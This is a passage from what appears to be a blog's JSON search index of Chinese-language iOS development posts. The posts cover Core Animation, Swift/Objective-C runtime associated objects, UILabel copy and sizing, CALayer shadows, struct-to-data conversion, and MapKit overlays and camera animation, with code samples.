可以设定auto&#39; 和 autoReverse’ 默认是nil，用来控制什么tangent切角关系 上边一堆高大上的属性，只需要记住的是 前三个 keyTimes、values、path。其中values和path是二选一，而keyTimes的设置方式是 123CAKeyframeAnimation *animation &#x3D; [CAKeyframeAnimation animation];[animation setDuration:10];[animation setKeyTimes:@[@0.0,@0.1,@0.5,@1.0]]; 此时动画的设置时长是10秒，关键帧设置到了0、0.1、0.5、1.0就是 0秒、1秒、5秒、10秒四个时刻","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"CoreAnimation","slug":"CoreAnimation","permalink":"http://yoursite.com/tags/CoreAnimation/"}]},{"title":"CAAnimation(一) 动画的分类和继承树","date":"2017-03-31T15:00:00.000Z","path":"2017/04/01/CAAnimation一动画的分类和继承树/","text":"CAAnimation的分类属性动画 CAPropertyAnimation根据官方文档CAAnimation的继承树和官方文档CAAnimation入门 我们可以得出两条结论 CAAnimation是基于OpenGL、OpenELS、Core Graphics的动画 CAAnimation中可以分为CAPropertyAnimation和CATransition两种，其中最常用的CABasicAnimation和CAKeyframeAnimation都是CAPropertyAnimation的子类 根据官方文档描述，无论你使用CABasicAnimation 还是 CAKeyframeAnimation 都是在使用 CAPropertyAnimation 隐式动画 Implicit Animation在官方文档高级动画技巧中，还提到了另外一个方式来做动画 CATransaction 动画事务，概念类似于数据库中的事务，可以参考文章Java中的事务，根据官方文档描述 1Core Animation automatically creates an implicit transaction whenever you add explicit or implicit animations to one of your layers. However, you can also create explicit transactions to manage those animations more precisely. 其实任何一个你新建的动画，都会自带一个隐式动画事务(Implicit Transaction)，你也可以自己使用CATransaction来显式声明(Explicit)，其过使用方式为面向过程的方式 1234[CATransaction begin];[CATransaction setValue:[NSNumber numberWithFloat:10.0f] forKey:kCATransactionAnimationDuration];&#x2F;&#x2F; Perform the animations[CATransaction commit]; CATransaction只能控制Layer的动画，如果想对view.layer进行控制，则需要使用UIView的类方法 1234UIView.beginAnimations(nil, context: nil)UIView.setAnimationDuration(interval)self.layer.setAffineTransform(CGAffineTransform(rotationAngle: angle));UIView.commitAnimations() 关于事务的概念这里就不再赘述，可以参考Java中的概念","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"CoreAnimation","slug":"CoreAnimation","permalink":"http://yoursite.com/tags/CoreAnimation/"}]},{"title":"Swift中Runtime的UnsafeRawPointer的问题","date":"2017-03-24T15:00:00.000Z","path":"2017/03/25/Runtime中UnsafeRawPointer指针问题/","text":"Swift和OC的一些不同在些文章长按复制的Label的时候，使用到了一个方法 123objc_getAssociatedObject()objc_setAssociatedObject() 使用Runtime对一个Object进行赋值取值，由于对Runtime用的还不如Java的Reflection多，匆匆忙忙的用了，被坑了一把 1234567&#x2F;&#x2F;Object COBJC_EXPORT id objc_getAssociatedObject(id object, const void *key)OBJC_EXPORT void objc_setAssociatedObject(id object, const void *key, id value, objc_AssociationPolicy policy)&#x2F;&#x2F;Swiftpublic func objc_getAssociatedObject(_ object: Any!, _ key: UnsafeRawPointer!) -&gt; Any!public func objc_setAssociatedObject(_ object: Any!, _ key: UnsafeRawPointer!, _ value: Any!, _ policy: objc_AssociationPolicy) key 参数的不同通过函数定义可以看出来 在OC中的key是一个 const void * 类型,代表的是C语言的一个地址，可以是一个函数，也可以是一个变量 在Swift中使用的是一个UnsafeRawPointer的对象且为非空 如果使用字符串key进行操作 12345678&#x2F;&#x2F;OC中不会报错objc_getAssociatedObject(obj, @&quot;someKey&quot;);objc_setAssociatedObject(obj, @&quot;someKey&quot;, someValue, OBJC_ASSOCIATION_ASSIGN);&#x2F;&#x2F;Error Swift中会报错objc_getAssociatedObject(obj, &quot;someKey&quot;)objc_setAssociatedObject(self, &quot;someKey&quot;, someValue, objc_AssociationPolicy.OBJC_ASSOCIATION_ASSIGN) 产生报错的原因就是在Swift中 对常量字符串的处理，并不一定是同一个地址 OC中是相当于把字符串的“someKey”的地址传入了方法， OC中两次都是同一个地址，所以没问题，但是在Swift中两次字符串不一定是同一个地址，为了确保无误 1234567&#x2F;&#x2F;声明一个全局变量private var copyKey:String &#x3D; &quot;COPY&quot;&#x2F;&#x2F;使用这个全局变量的地址作为Key，保证不变性objc_setAssociatedObject(self, &amp;copyKey, true, objc_AssociationPolicy.OBJC_ASSOCIATION_ASSIGN)objc_getAssociatedObject(self,&amp;copyKey) as! Bool 具体的原因可以去详读有关UnsafeRawPointer的官方文档 到底应该如何设置key通常来讲，我们的key需要是一个在C语言可以被访问到，并且不会变的地址, 那么通常需要相当的就是 static 全局变量 123static char someObjectKey &#x2F;&#x2F;使用 &amp;someObjectKey 作为key值#define SOME_KEY @&quot;SOME_KEY&quot; &#x2F;&#x2F; OC中的常量字符串都是存在同一个地址static NSString *const someKey &#x3D; @&quot;someKey&quot; &#x2F;&#x2F; 静态常量 既然是地址就可以，有一种更优雅的方法，就是直接使用当前函数的 “@selector” 的地址作为Key 123- (void)someFunction &#123; objc_setAssociatedObject(self, @selector(someFunction), nil, OBJC_ASSOCIATION_ASSIGN);&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Runtime","slug":"Runtime","permalink":"http://yoursite.com/tags/Runtime/"}]},{"title":"如何利用Playground实时预览界面","date":"2017-03-23T15:00:00.000Z","path":"2017/03/24/Playground实时预览界面/","text":"LiveView可以通过导入PlaygroundSupport，进行实时预览界面，然后如果想关停Playground的实时刷新，只需要长按那个Run按键即可 1234567891011121314151617181920212223242526&#x2F;&#x2F;: Playground - noun: a place where people can playimport UIKitimport PlaygroundSupportopen class TestView: UIView &#123; public override init(frame: CGRect) &#123; super.init(frame: frame) self.backgroundColor &#x3D; UIColor.white &#125; required public init(coder: NSCoder) &#123; fatalError(&quot;init(coder:) has not been implemented&quot;) &#125;&#125;let live: TestView &#x3D; TestView(frame: CGRect(x: 0, y: 0, width: 120, height: 120))PlaygroundPage.current.liveView &#x3D; live","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Playground","slug":"Playground","permalink":"http://yoursite.com/tags/Playground/"}]},{"title":"AnchorPoint的修改和原理","date":"2017-03-22T15:00:00.000Z","path":"2017/03/23/AnchorPoint的修改和原理/","text":"AnchorPoint是什么AnchorPoint从直译上来讲，就是固定点，代表了一系列的几何操作以哪个点作为参考点 **其取值范围是 [0,1]**，和物体的长宽高无关，在苹果动画的文章的章节 Anchor Points Affect Geometric Manipulations 有详细介绍 AnchorPoint的注意点 Mac和iOS坐标系不同在上图中我们可以发现，OS X系统 和 iOS系统的坐标系原点位置不同，导致AnchorPoint的位置也不同 AnchorPoint对物体的Position影响如开篇所说，AnchorPoint是一系列几何操作的参考点，如果在模式的 (0.5,0.5) 这种数值下，AnchorPoint就是通常所指的几何中心，如上图第一行，如果AnchorPoint数值更改为(0, 0),则物体的Position位置则不再是物体的几何中心，其映射到坐标系中的点会发生变化 1(100, 100)--------&gt;(40, 60) AnchorPoint对旋转的影响如果更改了AnchorPoint，改变物体的Transform则会受到影响，例如对正方体做 逆时针旋转45度 这个几何操作，如下图","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"AnchorPoint","slug":"AnchorPoint","permalink":"http://yoursite.com/tags/AnchorPoint/"}]},{"title":"UILabel的自适应","date":"2017-03-22T15:00:00.000Z","path":"2017/03/23/UILabel的自适应/","text":"UILabel的自适应很多UILabel的自适应里都是一堆文字算来算去。。。。这里发表一个比较简单的方法 先把UILabel的属性设置好 设置sizeToFit 重新根据Fit出来的Frame进行设定 1234567891011let label: UILabel &#x3D; UILabel(frame: CGRect.zero)label.text &#x3D; &quot;This is a Label&quot;label.textColor &#x3D; UIColor.whitelabel.backgroundColor &#x3D; UIColor.bluelabel.textAlignment &#x3D; .center&#x2F;&#x2F; Auto Fit Sizelabel.sizeToFit()label.frame &#x3D; CGRect(x: label.frame.origin.x , y: label.frame.origin.x , width: label.frame.width+50, height: label.frame.height+10)","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"UILabel","slug":"UILabel","permalink":"http://yoursite.com/tags/UILabel/"}]},{"title":"长按复制的UILabel","date":"2017-03-21T15:00:00.000Z","path":"2017/03/22/长按复制的UILabel/","text":"UILabel 长按复制注意Swift中Runtime的UnsafeRawPointer的问题 自从某个版本iOS的Label不再支持复制之后，才有了这个需求，给出了两版代码，并且在写的过程中发现了Swift Runtime的UnsafeRawPointer问题 Swift版本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465private var copyKey:String &#x3D; &quot;COPY&quot;private var titleKey:String &#x3D; &quot;TITLE&quot;extension UILabel &#123; &#x2F;&#x2F;设置是否可以拷贝 var canCopy:Bool &#123; get &#123; return objc_getAssociatedObject(self,&amp;copyKey) as! Bool &#125; set &#123; objc_setAssociatedObject(self, &amp;copyKey, newValue, objc_AssociationPolicy.OBJC_ASSOCIATION_ASSIGN) addLongPressGesture() &#125; &#125; &#x2F;&#x2F;设置复制文字 var copyTitle:String &#123; get &#123; var title &#x3D; objc_getAssociatedObject(self, &amp;titleKey) if(title &#x3D;&#x3D; nil) &#123; title &#x3D; &quot;复制&quot; &#125; return title as! String &#125; set &#123; objc_setAssociatedObject(self, &amp;titleKey, newValue, objc_AssociationPolicy.OBJC_ASSOCIATION_COPY_NONATOMIC) &#125; &#125; &#x2F;&#x2F;添加长按手势 func addLongPressGesture() -&gt; Void &#123; self.isUserInteractionEnabled &#x3D; true self.addGestureRecognizer(UILongPressGestureRecognizer.init(target: self, action:#selector(self.longPressToCopy(recognizer:)))) &#125; &#x2F;&#x2F;处理长按收拾 @objc fileprivate func longPressToCopy(recognizer: UILongPressGestureRecognizer) &#123; if (recognizer.state &#x3D;&#x3D; .ended) &#123; becomeFirstResponder() let item &#x3D; UIMenuItem(title: copyTitle, action: #selector(UILabel.copyText(sender:))) UIMenuController.shared.menuItems &#x3D; [item] UIMenuController.shared.setTargetRect(self.frame, in: self.superview!) UIMenuController.shared.setMenuVisible(true, animated: true) &#125; &#125; @objc fileprivate func copyText(sender: Any) &#123; &#x2F;&#x2F;通用粘贴板 let pasteBoard &#x3D; UIPasteboard.general &#x2F;&#x2F;有时候只想取UILabel得text中一部分 if(self.text !&#x3D; nil) &#123; pasteBoard.string &#x3D; self.text; return &#125; if(self.attributedText !&#x3D; nil) &#123; pasteBoard.string &#x3D; self.attributedText?.string return &#125; &#125; &#x2F;&#x2F;使label成为第一响应者 open override var canBecomeFirstResponder: Bool&#123; return canCopy &#125;&#125; OC版本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&#x2F;** * 使用Runtime给Label添加复制标签 *&#x2F;@interface UILabel (Copy)&#x2F;** * 是否可以复制 *&#x2F;@property (nonatomic, assign, getter&#x3D;isCopy) BOOL canCopy;@property (nonatomic, copy) NSString *copyTitle;@end@implementation UILabel (Copy)&#x2F;** * Get *&#x2F;- (BOOL)isCopy &#123; return [objc_getAssociatedObject(self, @&quot;canCopy&quot;) boolValue];&#125;&#x2F;** * Set *&#x2F;- (void)setCanCopy:(BOOL)canCopy &#123; objc_setAssociatedObject(self, @&quot;canCopy&quot;, @(canCopy), OBJC_ASSOCIATION_ASSIGN); [self attachTapHandler];&#125;&#x2F;** * Get 显示什么语言的复制 *&#x2F;- (NSString *)copyTitle &#123; id title &#x3D; objc_getAssociatedObject(self, @&quot;copyTitle&quot;); if(title &#x3D;&#x3D; nil) &#123; title &#x3D; @&quot;复制&quot;; &#125; return title;&#125;&#x2F;** * Set 显示什么语言的复制 *&#x2F;- (void)setCopyTitle:(NSString *)copyTitle &#123; objc_setAssociatedObject(self, @&quot;canCopy&quot;, copyTitle, OBJC_ASSOCIATION_COPY_NONATOMIC);&#125;&#x2F;** * 添加长按手势 *&#x2F;- (void)attachTapHandler &#123; [self setUserInteractionEnabled:YES]; UILongPressGestureRecognizer *longPress &#x3D; [[UILongPressGestureRecognizer alloc] initWithTarget:self action:@selector(handleLongPress:)]; [self addGestureRecognizer:longPress];&#125;&#x2F;** * 添加MenuBar * @param gesture *&#x2F;- (void)handleLongPress:(UILongPressGestureRecognizer *)gesture &#123; if(gesture.state &#x3D;&#x3D; UIGestureRecognizerStateEnded) &#123; [self becomeFirstResponder]; UIMenuItem *menuItem &#x3D; [[UIMenuItem alloc] initWithTitle:[self copyTitle] action:@selector(copyText:)]; [UIMenuController sharedMenuController].menuItems &#x3D; @[menuItem]; [[UIMenuController sharedMenuController] setTargetRect:self.frame inView:self.superview]; [[UIMenuController sharedMenuController] setMenuVisible:YES animated:YES]; &#125;&#125;&#x2F;** * 添加复制功能 * @param sender *&#x2F;- (void)copyText:(id)sender &#123; UIPasteboard *pasteboard &#x3D; [UIPasteboard generalPasteboard]; if(self.text) &#123; [pasteboard setString:self.text]; return; &#125; if (self.attributedText) &#123; [pasteboard setString:self.attributedText.string]; return; &#125;&#125;&#x2F;** * 重载是否能成为第一响应者 * @return *&#x2F;- (BOOL)canBecomeFirstResponder &#123; return [self isCopy];&#125;@end","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"UILabel","slug":"UILabel","permalink":"http://yoursite.com/tags/UILabel/"}]},{"title":"如何设置阴影","date":"2017-03-20T15:00:00.000Z","path":"2017/03/21/如何设置阴影/","text":"如何设置阴影如何想要设置阴影仅需要更改一个属性值，就是 shadowOpacity 该值默认为0，当更改后会以默认的黑色显示阴影 12345&#x2F;&#x2F;Colorself.backgroundColor &#x3D; UIColor.whiteshadowView.backgroundColor &#x3D; UIColor.yellow&#x2F;&#x2F;ShadowshadowView.layer.shadowOpacity &#x3D; 1 对阴影进行微调任何一个CALayer都是自带默认阴影的，只不过因为设置了透明，如果想进行微调，可以通过以下变量 123456789101112131415161718&#x2F;** Defaults Black **&#x2F;open var shadowColor: CGColor?&#x2F;* Defaults 0 *&#x2F;open var shadowOpacity: Float&#x2F;* Defaults to (0, -3) *&#x2F;open var shadowOffset: CGSize&#x2F;* Defaults to 3 *&#x2F;open var shadowRadius: CGFloat&#x2F;* Defaults to null *&#x2F;open var shadowPath: CGPath?","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"CALayer","slug":"CALayer","permalink":"http://yoursite.com/tags/CALayer/"}]},{"title":"结构体Struct转对象","date":"2017-03-18T15:00:00.000Z","path":"2017/03/19/结构体Struct转对象/","text":"官方结构体转对象有一个需求，想放一堆CGPoint进字典，因为字典只能接收Object，所以需要把Struct转换成NSValue这个Object，Apple自身也提供了一系列的转换方法 123NSValue *value &#x3D; [NSValue valueWithCGPoint:CGPointZero];CGPoint point &#x3D; [value CGPointValue]; 自定义结构体转NSData和官方提供的方法不同，自定的结构体可以转换成NSData 12345struct aStruct &#123; &#125;;aStruct exampleStruct;NSData *data &#x3D; [NSData dataWithBytes:&amp;exampleStruct length:sizeof(exampleStruct)];[data getBytes:&amp;exampleStruct length:sizeof(exampleStruct)]; Swift代码以下Swift的版本是 Swift3 Xcode 9.3 ， Swift:从入门到再次入门。。。。。。。。。 官方结构体1234let point: CGPoint &#x3D; CGPoint.zerolet value: NSValue &#x3D; NSValue(cgPoint: point)let result: CGPoint &#x3D; value.cgPointValue 自定义结构体由于Swift中存在 Data 和 NSData 两个对象，而且还存在Optional的可能 1234567891011121314151617181920struct ExampleStrcut &#123; public var x: CGFloat &#x3D; 0 public var y: CGFloat &#x3D; 0 public var z: CGFloat &#x3D; 0 public init() &#123; &#125;&#125;&#x2F;&#x2F;Data的情况下var example:ExampleStrcut &#x3D; ExampleStrcut()let data: Data &#x3D; Data(bytes: &amp;example, count: MemoryLayout&lt;ExampleStrcut&gt;.size)var decode: ExampleStrcut &#x3D; data.withUnsafeBytes &#123; (ptr: UnsafePointer&lt;ExampleStrcut&gt;) -&gt; ExampleStrcut in return ptr.pointee&#125;&#x2F;&#x2F;NSData的情况下let nsData: NSData &#x3D; NSData(bytes: &amp;example, length: MemoryLayout&lt;ExampleStrcut&gt;.size)var deNSData: ExampleStrcut &#x3D; ExampleStrcut()nsData.getBytes(&amp;deNSData, length: MemoryLayout&lt;ExampleStrcut&gt;.size)","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Struct","slug":"Struct","permalink":"http://yoursite.com/tags/Struct/"}]},{"title":"MKMapKit(OVA2)：Annotation返回nil的问题","date":"2017-03-13T15:00:00.000Z","path":"2017/03/14/MKMapKitOVA2Annotation返回nil的问题/","text":"Annotation返回nil显示什么在根据MapKit的官方代码里，在判断为 MKUserLocation 推荐返回nil，开始以为和TableView一样返回了nil就是不显示，后来发现不是这样 返回nil不是不显示AnnotationView，而是使用系统自带的Map Pin样式显示 如果想要不显示，需要返回一个纯透明空的自定义MKAnnotationView 12345678910111213- (MKAnnotationView *)mapView:(MKMapView *)mapView viewForAnnotation:(id &lt;MKAnnotation&gt;)annotation &#123; &#x2F;&#x2F; If the annotation is the user location, just return nil. if ([annotation isKindOfClass:[MKUserLocation class]]) &#123; return nil; &#x2F;&#x2F;这个nil是交给系统处理不显示 &#125; &#x2F;&#x2F; Handle any custom annotations. if ([annotation isKindOfClass:[CustomAnnotation class]]) &#123; ....... &#125; return nil; &#x2F;&#x2F;这个nil是交给系统处理，使用默认的Map Pin样式显示&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Annotation","slug":"Annotation","permalink":"http://yoursite.com/tags/Annotation/"},{"name":"MKMapKit","slug":"MKMapKit","permalink":"http://yoursite.com/tags/MKMapKit/"}]},{"title":"MKMapKit(OVA)：自定义追踪模式下如何平滑动画","date":"2017-03-12T15:00:00.000Z","path":"2017/03/13/MKMapKitOVA自定义追踪模式下如何平滑动画/","text":"自定义追踪根据文章[指南针模式][link01]我们知道可以在代理中设定camera的heading，但是这会带来一个问题 动画会因为代理调用的次数有卡顿感 1234- (void)locationManager:(CLLocationManager *)manager didUpdateHeading:(CLHeading *)newHeading &#123; [self.camera setHeading:[MapKit cameraHeadingInCameraHeadingModeByDegrees:heading]];&#125; 后来发现可以通过对 camera 进行赋值启动系统自带的动画缓冲 1234MKMapCamera *camera &#x3D; [[self camera] copy];camera.heading &#x3D; newHeading.trueHeading;[self setCamera:camera animated:YES];","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"MKMapKit","slug":"MKMapKit","permalink":"http://yoursite.com/tags/MKMapKit/"}]},{"title":"MKMapKit(十)：动态轨迹DynamicPathOverlay","date":"2017-03-11T15:00:00.000Z","path":"2017/03/12/MKMapKit十动态轨迹DynamicPathOverlay/","text":"动态轨迹Overlay根据网上一些代码整理和修改，得出以下的动态轨迹Overlay，其中结构体的Scale代表了颜色的百分比，1为最大值，0为最小值 Github代码 CrumbPathOverlay.h12345678910111213141516171819202122232425262728293031#import &lt;UIKit&#x2F;UIKit.h&gt;#import &lt;MapKit&#x2F;MapKit.h&gt;typedef struct &#123; CLLocationCoordinate2D coordinate; CGFloat scale;&#125;CrumbPoint;CG_INLINE CrumbPoint CrumbPointMake(CLLocationCoordinate2D coordinate, CGFloat scale) &#123; CrumbPoint point; point.coordinate &#x3D; coordinate; point.scale &#x3D; scale; return point;&#125;@interface CrumbPathOverlay : NSObject &lt;MKOverlay&gt;@property (nonatomic, weak) MKOverlayRenderer *render;@property (nonatomic, readonly) CrumbPoint *points;@property (nonatomic, readonly) NSUInteger pointsCount;- (instancetype)initWithOrigin:(CrumbPoint)point;- (void)addCoordinate:(CrumbPoint)point;- (void)lockPointArray;- (void)unlockPointArray;@end CrumbPathOverlay.m123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119#import &lt;pthread.h&gt;#import &quot;CrumbPathOverlay.h&quot;#define INITIAL_POINT_SPACE 1000#define MINIMUM_DELTA_METERS 10.0@interface CrumbPathOverlay()@property (nonatomic, assign) MKMapRect boundingRect;@property (nonatomic, assign) pthread_rwlock_t rwLock;@property (nonatomic, assign) NSUInteger pointSpace;@end@implementation CrumbPathOverlay- (instancetype)initWithOrigin:(CrumbPoint)point &#123; self &#x3D; [super init]; if (self) &#123; _pointSpace &#x3D; INITIAL_POINT_SPACE; _pointsCount &#x3D; 1; _points &#x3D; malloc(sizeof(CrumbPoint)*_pointSpace); _points[0] &#x3D; point; _boundingRect &#x3D; [self worldRectWithCenter:_points[0].coordinate]; pthread_rwlock_init(&amp;_rwLock,NULL); &#125; return self;&#125;- (CLLocationCoordinate2D)coordinate &#123; return _points[0].coordinate;&#125;- (MKMapRect)boundingMapRect &#123; return _boundingRect;&#125;- (MKMapRect)worldRectWithCenter:(CLLocationCoordinate2D)coordinate &#123; MKMapPoint center &#x3D; MKMapPointForCoordinate(coordinate); double width &#x3D; MKMapSizeWorld.width&#x2F;4; double height &#x3D; MKMapSizeWorld.height&#x2F;4; MKMapPoint origin &#x3D; MKMapPointMake(center.x - width&#x2F;2, center.y - height&#x2F;2); return MKMapRectMake(origin.x, origin.y, width , height);&#125;-(void)dealloc&#123; free(_points); pthread_rwlock_destroy(&amp;_rwLock);&#125;#pragma mark - Point add- (void)addCoordinate:(CrumbPoint)point &#123; &#x2F;&#x2F;LOCK Thread because we are going to changing the list of points pthread_rwlock_wrlock(&amp;_rwLock); &#x2F;&#x2F;receive new point and previous point MKMapPoint newPoint &#x3D; MKMapPointForCoordinate(point.coordinate); MKMapPoint prevPoint &#x3D; MKMapPointForCoordinate(_points[_pointsCount-1].coordinate); &#x2F;&#x2F;Get the distance between this new point and previous point CLLocationDistance metersApart &#x3D; MKMetersBetweenMapPoints(newPoint, prevPoint); MKMapRect updateRect &#x3D; MKMapRectNull; if (metersApart &gt; MINIMUM_DELTA_METERS)&#123; &#x2F;&#x2F;Grow (multiply 2) the points array if full if (_pointSpace &#x3D;&#x3D; _pointsCount)&#123; _pointSpace *&#x3D; 2; _points &#x3D; realloc(_points, sizeof(CrumbPoint) * _pointSpace); &#125; &#x2F;&#x2F;Add the new point to points array _points[_pointsCount] &#x3D; point; _pointsCount++; &#x2F;&#x2F;Compute MKMapRect bounding prevPoint and newPoint double minX &#x3D; MIN(newPoint.x,prevPoint.x); double minY &#x3D; MIN(newPoint.y,prevPoint.y); double maxX &#x3D; MAX(newPoint.x, prevPoint.x); double maxY &#x3D; MAX(newPoint.y, prevPoint.y); updateRect &#x3D; MKMapRectMake(minX, minY, maxX - minX, maxY - minY); &#125; &#x2F;&#x2F;UNLOCK Thread pthread_rwlock_unlock(&amp;_rwLock); &#x2F;&#x2F;Make Update Display if (_render) &#123; [_render setNeedsDisplayInMapRect:updateRect]; &#125;&#125;#pragma mark - Thread Lock- (void)lockPointArray &#123; pthread_rwlock_rdlock(&amp;_rwLock);&#125;- (void)unlockPointArray &#123; pthread_rwlock_unlock(&amp;_rwLock);&#125;@end 动态轨迹RenderCrumbPathRender.h12345678910111213141516#import &lt;UIKit&#x2F;UIKit.h&gt;#import &lt;MapKit&#x2F;MapKit.h&gt;#import &quot;CrumbPathOverlay.h&quot;@interface CrumbPathRender : MKOverlayPathRenderer- (instancetype)initWithOverlay:(CrumbPathOverlay *)overlay;@property (nonatomic, assign) CGFloat beginHue;@property (nonatomic, assign) CGFloat endHue;@property (nonatomic, assign) CGFloat minScreenPointDelta;@end CrumbPathRender.m123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146#import &quot;CrumbPathRender.h&quot;@interface CrumbPathRender ()@property (nonatomic, weak) CrumbPathOverlay *crumb;@property (nonatomic, assign) CGFloat hueRange;@end@implementation CrumbPathRender- (instancetype)initWithOverlay:(CrumbPathOverlay *)overlay &#123; self &#x3D; [super initWithOverlay:overlay]; if (self)&#123; _crumb &#x3D; overlay; _beginHue &#x3D; 0.3; _endHue &#x3D; 0.03; _minScreenPointDelta &#x3D; 5.0; _hueRange &#x3D; _beginHue - _endHue; _crumb.render &#x3D; self; self.fillColor &#x3D; [UIColor blueColor]; self.lineWidth &#x3D; 5; &#125; return self;&#125;- (id&lt;MKOverlay&gt;)overlay &#123; return _crumb;&#125;- (BOOL)canDrawMapRect:(MKMapRect)mapRect zoomScale:(MKZoomScale)zoomScale &#123; return _crumb?YES:NO;&#125;- (void)drawMapRect:(MKMapRect)mapRect zoomScale:(MKZoomScale)zoomScale inContext:(CGContextRef)context &#123; &#x2F;&#x2F;Lock Add [_crumb lockPointArray]; &#x2F;&#x2F;Prepare ClipRect CGFloat lineWidth &#x3D; self.lineWidth; lineWidth &#x3D; lineWidth &#x2F; zoomScale; MKMapRect clipRect &#x3D; MKMapRectInset(mapRect, -lineWidth, -lineWidth); &#x2F;&#x2F;Make Limit Distance double minMapPointDelta &#x3D; pow(_minScreenPointDelta &#x2F; zoomScale,2); &#x2F;&#x2F;For to Add CrumbPoint point,prevPoint &#x3D; _crumb.points[0]; for (int i &#x3D; 1;i &lt; _crumb.pointsCount;i++)&#123; point &#x3D; _crumb.points[i]; CGMutablePathRef path &#x3D; CGPathCreateMutable(); &#x2F;&#x2F;Convert Map Point MKMapPoint mapPoint &#x3D; MKMapPointForCoordinate(point.coordinate); MKMapPoint prevMapPoint &#x3D; MKMapPointForCoordinate(prevPoint.coordinate); &#x2F;&#x2F;Check Delta double pointDelta &#x3D; pow(mapPoint.x - prevMapPoint.x,2) + pow(mapPoint.y - prevMapPoint.y,2); if (pointDelta &lt; minMapPointDelta &amp;&amp; i &lt; _crumb.pointsCount - 1) &#123; prevPoint &#x3D; point; continue; &#125; &#x2F;&#x2F;Check Area if ([CrumbPathRender linePoint:mapPoint and:prevMapPoint intersectsRect:clipRect]) &#123; &#x2F;&#x2F;Add Line CGPoint startPoint &#x3D; [self pointForMapPoint:mapPoint]; CGPoint endPoint &#x3D; [self pointForMapPoint:prevMapPoint]; CGPathMoveToPoint(path, NULL, startPoint.x, startPoint.y); CGPathAddLineToPoint(path, NULL, endPoint.x, endPoint.y); &#x2F;&#x2F;Save State CGContextSaveGState(context); &#x2F;&#x2F;Line Prepare CGPathRef pathToFill &#x3D; CGPathCreateCopyByStrokingPath(path, NULL, lineWidth, self.lineCap, self.lineJoin, self.miterLimit); CGContextAddPath(context, pathToFill); CGContextClip(context); &#x2F;&#x2F;Color Prepare UIColor *startColor, *endColor; if(point.scale &#x3D;&#x3D; CGFLOAT_MAX) &#123; startColor &#x3D; self.fillColor; endColor &#x3D; self.fillColor; &#125; else &#123; CGFloat scale &#x3D; [CrumbPathRender distributeScale:prevPoint.scale]; startColor &#x3D; [CrumbPathRender hueColor:_beginHue - scale *_hueRange]; scale &#x3D; [CrumbPathRender distributeScale:point.scale]; endColor &#x3D; [CrumbPathRender hueColor:_beginHue - scale*_hueRange]; &#125; CGGradientRef gradient &#x3D; [CrumbPathRender lineColorGradient:startColor and:endColor]; &#x2F;&#x2F;Add Color CGContextDrawLinearGradient(context, gradient, startPoint, endPoint, kCGGradientDrawsAfterEndLocation); &#x2F;&#x2F;Release Color CGGradientRelease(gradient); &#x2F;&#x2F;Return State for Next CGContextRestoreGState(context); &#125; prevPoint &#x3D; point; CGPathRelease(path); &#125; [_crumb unlockPointArray];&#125;+ (CGFloat)distributeScale:(CGFloat)scale &#123; CGFloat temp &#x3D; scale; temp &#x3D; temp &gt; 1? 1: (temp &lt; 0 ? 0 : temp); return temp;&#125;+ (UIColor *)hueColor:(CGFloat)hue &#123; return [UIColor colorWithHue:hue saturation:1.0f brightness:1.0f alpha:1.0f];&#125;+ (BOOL)linePoint:(MKMapPoint)p0 and:(MKMapPoint)p1 intersectsRect:(MKMapRect) r &#123; double minX &#x3D; MIN(p0.x, p1.x); double minY &#x3D; MIN(p0.y, p1.y); double maxX &#x3D; MAX(p0.x, p1.x); double maxY &#x3D; MAX(p0.y, p1.y); MKMapRect r2 &#x3D; MKMapRectMake(minX, minY, maxX - minX, maxY - minY); return MKMapRectIntersectsRect(r, r2);&#125;+ (CGGradientRef)lineColorGradient:(UIColor *)startColor and:(UIColor *)endColor &#123; &#x2F;&#x2F;Color Prepare CGFloat pc_r,pc_g,pc_b,pc_a, cc_r,cc_g,cc_b,cc_a; [startColor getRed:&amp;pc_r green:&amp;pc_g blue:&amp;pc_b alpha:&amp;pc_a]; [endColor getRed:&amp;cc_r green:&amp;cc_g blue:&amp;cc_b alpha:&amp;cc_a]; CGFloat gradientColors[8] &#x3D; &#123;pc_r,pc_g,pc_b,pc_a, cc_r,cc_g,cc_b,cc_a&#125;; CGFloat gradientLocation[2] &#x3D; &#123;0,1&#125;; CGColorSpaceRef colorSpace &#x3D; CGColorSpaceCreateDeviceRGB(); CGGradientRef gradient &#x3D; CGGradientCreateWithColorComponents(colorSpace, gradientColors, gradientLocation, 2); CGColorSpaceRelease(colorSpace); return gradient;&#125;@end","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"MKMapKit","slug":"MKMapKit","permalink":"http://yoursite.com/tags/MKMapKit/"},{"name":"Overlay","slug":"Overlay","permalink":"http://yoursite.com/tags/Overlay/"}]},{"title":"MKMapKit(九)：动态圆形DynamicCircleOverlay","date":"2017-03-10T15:00:00.000Z","path":"2017/03/11/MKMapKit九动态圆形DynamicCircleOverlay/","text":"Overlay的准备根据文章[动态Overlay绘制][link01]提到的要点，我们需要一个有世界范围一半的Bounding来保证Circle在扩大的过程中不会变形 